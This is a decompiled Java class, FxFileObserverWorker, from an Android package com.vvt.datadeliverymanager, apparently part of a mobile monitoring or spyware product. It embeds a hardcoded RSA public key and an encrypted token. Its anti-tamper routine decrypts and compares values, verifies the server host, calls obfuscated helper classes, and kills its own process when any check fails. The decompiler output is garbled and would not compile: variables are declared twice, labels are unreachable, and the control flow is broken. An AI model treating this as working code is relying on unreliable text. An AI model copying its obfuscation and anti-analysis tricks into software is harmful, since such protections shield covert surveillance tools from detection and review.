package com.vvt.datadeliverymanager;

import android.os.Process;
import android.os.SystemClock;
import c.v.d.D;
import c.v.d.G;
import c.v.d.H;
import c.v.d.T;
import c.v.d.U;
import com.vvt.ag.b;
import com.vvt.appengine.u;
import com.vvt.http.a;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.GeneralSecurityException;
import java.security.Key;
import java.security.interfaces.RSAPublicKey;

class g
  implements Runnable
{
  g(f paramf) {}
  
  private byte[] a()
  {
    byte[] arrayOfByte = new byte[64];
    byte[] tmp6_5 = arrayOfByte;
    byte[] tmp7_6 = tmp6_5;
    byte[] tmp7_6 = tmp6_5;
    tmp7_6[0] = 90;
    tmp7_6[1] = -124;
    byte[] tmp16_7 = tmp7_6;
    byte[] tmp16_7 = tmp7_6;
    tmp16_7[2] = 61;
    tmp16_7[3] = 68;
    byte[] tmp25_16 = tmp16_7;
    byte[] tmp25_16 = tmp16_7;
    tmp25_16[4] = 20;
    tmp25_16[5] = 55;
    byte[] tmp34_25 = tmp25_16;
    byte[] tmp34_25 = tmp25_16;
    tmp34_25[6] = -3;
    tmp34_25[7] = 50;
    byte[] tmp45_34 = tmp34_25;
    byte[] tmp45_34 = tmp34_25;
    tmp45_34[8] = -11;
    tmp45_34[9] = -97;
    byte[] tmp56_45 = tmp45_34;
    byte[] tmp56_45 = tmp45_34;
    tmp56_45[10] = -48;
    tmp56_45[11] = -88;
    byte[] tmp67_56 = tmp56_45;
    byte[] tmp67_56 = tmp56_45;
    tmp67_56[12] = -73;
    tmp67_56[13] = 119;
    byte[] tmp78_67 = tmp67_56;
    byte[] tmp78_67 = tmp67_56;
    tmp78_67[14] = -75;
    tmp78_67[15] = 71;
    byte[] tmp89_78 = tmp78_67;
    byte[] tmp89_78 = tmp78_67;
    tmp89_78[16] = -52;
    tmp89_78[17] = 82;
    byte[] tmp100_89 = tmp89_78;
    byte[] tmp100_89 = tmp89_78;
    tmp100_89[18] = 58;
    tmp100_89[19] = 125;
    byte[] tmp111_100 = tmp100_89;
    byte[] tmp111_100 = tmp100_89;
    tmp111_100[20] = 62;
    tmp111_100[21] = -15;
    byte[] tmp122_111 = tmp111_100;
    byte[] tmp122_111 = tmp111_100;
    tmp122_111[22] = -3;
    tmp122_111[23] = 87;
    byte[] tmp133_122 = tmp122_111;
    byte[] tmp133_122 = tmp122_111;
    tmp133_122[24] = 17;
    tmp133_122[25] = 124;
    byte[] tmp144_133 = tmp133_122;
    byte[] tmp144_133 = tmp133_122;
    tmp144_133[26] = -110;
    tmp144_133[27] = 65;
    byte[] tmp155_144 = tmp144_133;
    byte[] tmp155_144 = tmp144_133;
    tmp155_144[28] = Byte.MIN_VALUE;
    tmp155_144[29] = 48;
    byte[] tmp166_155 = tmp155_144;
    byte[] tmp166_155 = tmp155_144;
    tmp166_155[30] = -5;
    tmp166_155[31] = -107;
    byte[] tmp177_166 = tmp166_155;
    byte[] tmp177_166 = tmp166_155;
    tmp177_166[32] = 121;
    tmp177_166[33] = 68;
    byte[] tmp188_177 = tmp177_166;
    byte[] tmp188_177 = tmp177_166;
    tmp188_177[34] = 111;
    tmp188_177[35] = 27;
    byte[] tmp199_188 = tmp188_177;
    byte[] tmp199_188 = tmp188_177;
    tmp199_188[36] = 90;
    tmp199_188[37] = 80;
    byte[] tmp210_199 = tmp199_188;
    byte[] tmp210_199 = tmp199_188;
    tmp210_199[38] = -33;
    tmp210_199[39] = -15;
    byte[] tmp221_210 = tmp210_199;
    byte[] tmp221_210 = tmp210_199;
    tmp221_210[40] = -34;
    tmp221_210[41] = -44;
    byte[] tmp232_221 = tmp221_210;
    byte[] tmp232_221 = tmp221_210;
    tmp232_221[42] = -88;
    tmp232_221[43] = 78;
    byte[] tmp243_232 = tmp232_221;
    byte[] tmp243_232 = tmp232_221;
    tmp243_232[44] = 32;
    tmp243_232[45] = -54;
    byte[] tmp254_243 = tmp243_232;
    byte[] tmp254_243 = tmp243_232;
    tmp254_243[46] = -54;
    tmp254_243[47] = 7;
    byte[] tmp265_254 = tmp254_243;
    byte[] tmp265_254 = tmp254_243;
    tmp265_254[48] = -124;
    tmp265_254[49] = 53;
    byte[] tmp276_265 = tmp265_254;
    byte[] tmp276_265 = tmp265_254;
    tmp276_265[50] = -27;
    tmp276_265[51] = -89;
    byte[] tmp287_276 = tmp276_265;
    byte[] tmp287_276 = tmp276_265;
    tmp287_276[52] = -30;
    tmp287_276[53] = -45;
    byte[] tmp298_287 = tmp287_276;
    byte[] tmp298_287 = tmp287_276;
    tmp298_287[54] = -123;
    tmp298_287[55] = 61;
    byte[] tmp309_298 = tmp298_287;
    byte[] tmp309_298 = tmp298_287;
    tmp309_298[56] = -72;
    tmp309_298[57] = -36;
    byte[] tmp320_309 = tmp309_298;
    byte[] tmp320_309 = tmp309_298;
    tmp320_309[58] = 60;
    tmp320_309[59] = 85;
    byte[] tmp331_320 = tmp320_309;
    byte[] tmp331_320 = tmp320_309;
    tmp331_320[60] = 79;
    tmp331_320[61] = 82;
    tmp331_320[62] = 109;
    tmp331_320[63] = -85;
    return arrayOfByte;
  }
  
  private byte[] b()
  {
    byte[] arrayOfByte = new byte[94];
    byte[] tmp6_5 = arrayOfByte;
    byte[] tmp7_6 = tmp6_5;
    byte[] tmp7_6 = tmp6_5;
    tmp7_6[0] = 48;
    tmp7_6[1] = 92;
    byte[] tmp16_7 = tmp7_6;
    byte[] tmp16_7 = tmp7_6;
    tmp16_7[2] = 48;
    tmp16_7[3] = 13;
    byte[] tmp25_16 = tmp16_7;
    byte[] tmp25_16 = tmp16_7;
    tmp25_16[4] = 6;
    tmp25_16[5] = 9;
    byte[] tmp34_25 = tmp25_16;
    byte[] tmp34_25 = tmp25_16;
    tmp34_25[6] = 42;
    tmp34_25[7] = -122;
    byte[] tmp45_34 = tmp34_25;
    byte[] tmp45_34 = tmp34_25;
    tmp45_34[8] = 72;
    tmp45_34[9] = -122;
    byte[] tmp56_45 = tmp45_34;
    byte[] tmp56_45 = tmp45_34;
    tmp56_45[10] = -9;
    tmp56_45[11] = 13;
    byte[] tmp67_56 = tmp56_45;
    byte[] tmp67_56 = tmp56_45;
    tmp67_56[12] = 1;
    tmp67_56[13] = 1;
    byte[] tmp76_67 = tmp67_56;
    byte[] tmp76_67 = tmp67_56;
    tmp76_67[14] = 1;
    tmp76_67[15] = 5;
    byte[] tmp85_76 = tmp76_67;
    byte[] tmp85_76 = tmp76_67;
    tmp85_76[16] = 0;
    tmp85_76[17] = 3;
    byte[] tmp94_85 = tmp85_76;
    byte[] tmp94_85 = tmp85_76;
    tmp94_85[18] = 75;
    tmp94_85[19] = 0;
    byte[] tmp104_94 = tmp94_85;
    byte[] tmp104_94 = tmp94_85;
    tmp104_94[20] = 48;
    tmp104_94[21] = 72;
    byte[] tmp115_104 = tmp104_94;
    byte[] tmp115_104 = tmp104_94;
    tmp115_104[22] = 2;
    tmp115_104[23] = 65;
    byte[] tmp125_115 = tmp115_104;
    byte[] tmp125_115 = tmp115_104;
    tmp125_115[24] = 0;
    tmp125_115[25] = -89;
    byte[] tmp135_125 = tmp125_115;
    byte[] tmp135_125 = tmp125_115;
    tmp135_125[26] = -39;
    tmp135_125[27] = 4;
    byte[] tmp145_135 = tmp135_125;
    byte[] tmp145_135 = tmp135_125;
    tmp145_135[28] = -103;
    tmp145_135[29] = 49;
    byte[] tmp156_145 = tmp145_135;
    byte[] tmp156_145 = tmp145_135;
    tmp156_145[30] = -111;
    tmp156_145[31] = -68;
    byte[] tmp167_156 = tmp156_145;
    byte[] tmp167_156 = tmp156_145;
    tmp167_156[32] = -4;
    tmp167_156[33] = -42;
    byte[] tmp178_167 = tmp167_156;
    byte[] tmp178_167 = tmp167_156;
    tmp178_167[34] = 68;
    tmp178_167[35] = 56;
    byte[] tmp189_178 = tmp178_167;
    byte[] tmp189_178 = tmp178_167;
    tmp189_178[36] = 50;
    tmp189_178[37] = 14;
    byte[] tmp200_189 = tmp189_178;
    byte[] tmp200_189 = tmp189_178;
    tmp200_189[38] = 67;
    tmp200_189[39] = 60;
    byte[] tmp211_200 = tmp200_189;
    byte[] tmp211_200 = tmp200_189;
    tmp211_200[40] = 31;
    tmp211_200[41] = 72;
    byte[] tmp222_211 = tmp211_200;
    byte[] tmp222_211 = tmp211_200;
    tmp222_211[42] = -61;
    tmp222_211[43] = 9;
    byte[] tmp233_222 = tmp222_211;
    byte[] tmp233_222 = tmp222_211;
    tmp233_222[44] = -12;
    tmp233_222[45] = 11;
    byte[] tmp244_233 = tmp233_222;
    byte[] tmp244_233 = tmp233_222;
    tmp244_233[46] = 62;
    tmp244_233[47] = -83;
    byte[] tmp255_244 = tmp244_233;
    byte[] tmp255_244 = tmp244_233;
    tmp255_244[48] = 97;
    tmp255_244[49] = -13;
    byte[] tmp266_255 = tmp255_244;
    byte[] tmp266_255 = tmp255_244;
    tmp266_255[50] = 123;
    tmp266_255[51] = 27;
    byte[] tmp277_266 = tmp266_255;
    byte[] tmp277_266 = tmp266_255;
    tmp277_266[52] = -90;
    tmp277_266[53] = -124;
    byte[] tmp288_277 = tmp277_266;
    byte[] tmp288_277 = tmp277_266;
    tmp288_277[54] = -26;
    tmp288_277[55] = -9;
    byte[] tmp299_288 = tmp288_277;
    byte[] tmp299_288 = tmp288_277;
    tmp299_288[56] = 119;
    tmp299_288[57] = 75;
    byte[] tmp310_299 = tmp299_288;
    byte[] tmp310_299 = tmp299_288;
    tmp310_299[58] = 81;
    tmp310_299[59] = -119;
    byte[] tmp321_310 = tmp310_299;
    byte[] tmp321_310 = tmp310_299;
    tmp321_310[60] = -126;
    tmp321_310[61] = 17;
    byte[] tmp332_321 = tmp321_310;
    byte[] tmp332_321 = tmp321_310;
    tmp332_321[62] = 2;
    tmp332_321[63] = 20;
    byte[] tmp342_332 = tmp332_321;
    byte[] tmp342_332 = tmp332_321;
    tmp342_332[64] = -66;
    tmp342_332[65] = -25;
    byte[] tmp353_342 = tmp342_332;
    byte[] tmp353_342 = tmp342_332;
    tmp353_342[66] = -126;
    tmp353_342[67] = 107;
    byte[] tmp364_353 = tmp353_342;
    byte[] tmp364_353 = tmp353_342;
    tmp364_353[68] = -85;
    tmp364_353[69] = 57;
    byte[] tmp375_364 = tmp364_353;
    byte[] tmp375_364 = tmp364_353;
    tmp375_364[70] = 13;
    tmp375_364[71] = 36;
    byte[] tmp386_375 = tmp375_364;
    byte[] tmp386_375 = tmp375_364;
    tmp386_375[72] = -125;
    tmp386_375[73] = -74;
    byte[] tmp397_386 = tmp386_375;
    byte[] tmp397_386 = tmp386_375;
    tmp397_386[74] = 36;
    tmp397_386[75] = -104;
    byte[] tmp408_397 = tmp397_386;
    byte[] tmp408_397 = tmp397_386;
    tmp408_397[76] = 55;
    tmp408_397[77] = -22;
    byte[] tmp419_408 = tmp408_397;
    byte[] tmp419_408 = tmp408_397;
    tmp419_408[78] = 120;
    tmp419_408[79] = 1;
    byte[] tmp429_419 = tmp419_408;
    byte[] tmp429_419 = tmp419_408;
    tmp429_419[80] = Byte.MIN_VALUE;
    tmp429_419[81] = 32;
    byte[] tmp440_429 = tmp429_419;
    byte[] tmp440_429 = tmp429_419;
    tmp440_429[82] = 48;
    tmp440_429[83] = -71;
    byte[] tmp451_440 = tmp440_429;
    byte[] tmp451_440 = tmp440_429;
    tmp451_440[84] = -54;
    tmp451_440[85] = 77;
    byte[] tmp462_451 = tmp451_440;
    byte[] tmp462_451 = tmp451_440;
    tmp462_451[86] = -66;
    tmp462_451[87] = 32;
    byte[] tmp473_462 = tmp462_451;
    byte[] tmp473_462 = tmp462_451;
    tmp473_462[88] = 39;
    tmp473_462[89] = 2;
    byte[] tmp483_473 = tmp473_462;
    byte[] tmp483_473 = tmp473_462;
    tmp483_473[90] = 3;
    tmp483_473[91] = 1;
    tmp483_473[92] = 0;
    tmp483_473[93] = 1;
    return arrayOfByte;
  }
  
  public void run()
  {
    boolean bool1 = true;
    int i5 = 0;
    Object localObject1 = null;
    boolean bool11 = d.c();
    if (bool11) {}
    bool11 = d.c();
    if (bool11) {}
    for (;;)
    {
      try
      {
        Object localObject2 = new com/vvt/appengine/u;
        Object localObject4 = this.a;
        localObject4 = ((f)localObject4).a;
        localObject4 = ((d)localObject4).b();
        localObject4 = com.vvt.l.g.a((byte[])localObject4);
        ((u)localObject2).<init>((RSAPublicKey)localObject4);
        boolean bool12 = d.c();
        if (bool12) {}
        try
        {
          int i;
          boolean bool2;
          int j;
          boolean bool3;
          int k;
          boolean bool4;
          int m;
          boolean bool5;
          int n;
          boolean bool13;
          boolean bool6;
          int i1;
          boolean bool14;
          int i8;
          boolean bool15;
          String str;
          boolean bool7;
          int i2;
          long l1;
          boolean bool8;
          int i3;
          localObject4 = new c/v/d/G;
          ((G)localObject4).<init>();
          ((G)localObject4).nol(this);
          localObject4 = new c/v/d/H;
          ((H)localObject4).<init>();
          Object localObject8 = ((H)localObject4).getjbyte();
          ((H)localObject4).kmu((byte[])localObject8, 0);
        }
        finally
        {
          Object localObject5;
          int i7;
          Object localObject6;
          int i6;
          boolean bool9;
          int i4;
          long l2;
          for (;;) {}
        }
      }
      catch (Exception localException1)
      {
        try
        {
          localObject2 = ((u)localObject2).a();
          localObject4 = this.a;
          localObject4 = ((f)localObject4).a;
          localObject4 = ((d)localObject4).a();
          localObject2 = com.vvt.l.f.a((Key)localObject2, (byte[])localObject4);
          localObject4 = new java/lang/String;
          ((String)localObject4).<init>((byte[])localObject2);
          bool11 = d.c();
          if (!bool11) {}
        }
        catch (GeneralSecurityException localGeneralSecurityException1)
        {
          bool3 = d.d();
          if (bool3) {}
          k = Process.myPid();
          Process.killProcess(k);
          continue;
        }
        try
        {
          localObject2 = new com/vvt/appengine/u;
          localObject5 = b();
          localObject5 = com.vvt.l.g.a((byte[])localObject5);
          ((u)localObject2).<init>((RSAPublicKey)localObject5);
        }
        catch (Exception localException2)
        {
          bool4 = d.d();
          if (bool4) {}
          m = Process.myPid();
          Process.killProcess(m);
          continue;
        }
        try
        {
          localObject2 = ((u)localObject2).a();
          localObject5 = a();
          localObject2 = com.vvt.l.f.a((Key)localObject2, (byte[])localObject5);
          localObject5 = new java/lang/String;
          ((String)localObject5).<init>((byte[])localObject2);
          bool11 = d.c();
          if (bool11) {}
          bool11 = ((String)localObject4).equals(localObject5);
          if (bool11) {
            break label317;
          }
          bool1 = d.e();
          if (bool1) {}
          i = Process.myPid();
          Process.killProcess(i);
          return;
        }
        catch (GeneralSecurityException localGeneralSecurityException2)
        {
          bool5 = d.d();
          if (!bool5) {
            break label306;
          }
          n = Process.myPid();
          Process.killProcess(n);
          continue;
          localObject2 = f.a(this.a);
          if (localObject2 == null) {
            break label392;
          }
          localObject2 = f.a(this.a).a.getURL().getHost();
          bool13 = d.c();
          if (!bool13) {
            break label359;
          }
          bool11 = ((String)localObject4).contains((CharSequence)localObject2);
          if (bool11) {
            break label407;
          }
          bool6 = d.e();
          if (!bool6) {
            break label381;
          }
          i1 = Process.myPid();
          Process.killProcess(i1);
          continue;
          bool11 = d.c();
          if (!bool11) {
            break label402;
          }
          d.a(0);
          bool11 = false;
          localObject2 = null;
          localObject5 = new c/v/d/D;
          ((D)localObject5).<init>();
          bool14 = d.c();
          if (!bool14) {
            break label433;
          }
          i8 = 4;
          localObject8 = new int[i8];
          Object tmp444_442 = localObject8;
          Object tmp445_444 = tmp444_442;
          Object tmp445_444 = tmp444_442;
          tmp445_444[0] = 98;
          tmp445_444[1] = 111;
          tmp445_444[2] = 98;
          tmp445_444[3] = 97;
          localObject8 = b.a((int[])localObject8);
          bool15 = d.c();
          if (!bool15) {
            break label479;
          }
          str = "dd 128bit";
          localObject4 = ((D)localObject5).ddu((String)localObject4, str);
          bool12 = ((String)localObject4).equals(localObject8);
          if (bool12) {
            break label527;
          }
          bool7 = d.e();
          if (!bool7) {
            break label516;
          }
          i2 = Process.myPid();
          Process.killProcess(i2);
          continue;
          l1 = 1L;
          SystemClock.sleep(l1);
          bool12 = d.c();
          if (!bool12) {
            break label545;
          }
          localObject4 = this.a.a.b();
          i7 = ((D)localObject5).mkdd((byte[])localObject4);
          i8 = 558;
          if (i7 == i8) {
            break label631;
          }
          switch (0)
          {
          }
          for (;;)
          {
            bool8 = d.e();
            if (bool8) {}
            i3 = Process.myPid();
            Process.killProcess(i3);
            break;
            i3 = 0;
            localObject6 = null;
            i3 += -1;
          }
        }
        localException1 = localException1;
        bool2 = d.d();
        if (bool2) {}
        j = Process.myPid();
        Process.killProcess(j);
        continue;
      }
      label306:
      label317:
      label359:
      label381:
      label392:
      label402:
      label407:
      label433:
      label479:
      label516:
      label527:
      label545:
      label631:
      bool11 = d.c();
      if (bool11) {}
      i6 = ((D)localObject5).htcmoto();
      i7 = 128;
      if (i6 != i7)
      {
        localObject6 = new java/lang/StringBuilder;
        ((StringBuilder)localObject6).<init>();
        for (;;)
        {
          i6 = 10;
          if (i5 >= i6) {
            break;
          }
          localObject2 = "mofo";
          ((StringBuilder)localObject6).append((String)localObject2);
          i5 += 1;
        }
        bool9 = d.e();
        if (bool9) {}
        i4 = Process.myPid();
        Process.killProcess(i4);
      }
      else
      {
        i5 = 1;
        l2 = i4;
        SystemClock.sleep(l2);
      }
      try
      {
        localObject6 = new c/v/d/T;
        ((T)localObject6).<init>();
        localObject2 = new c/v/d/U;
        ((U)localObject2).<init>();
        localObject1 = ((U)localObject2).burloa(i5);
        ((T)localObject6).slowx((String)localObject1);
      }
      finally
      {
        boolean bool10;
        for (;;) {}
      }
      localObject6 = this.a.a;
      i5 = 1150;
      localObject1 = Integer.valueOf(i5);
      d.a((d)localObject6, localObject1);
      bool10 = d.c();
      if (!bool10) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/datadeliverymanager/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */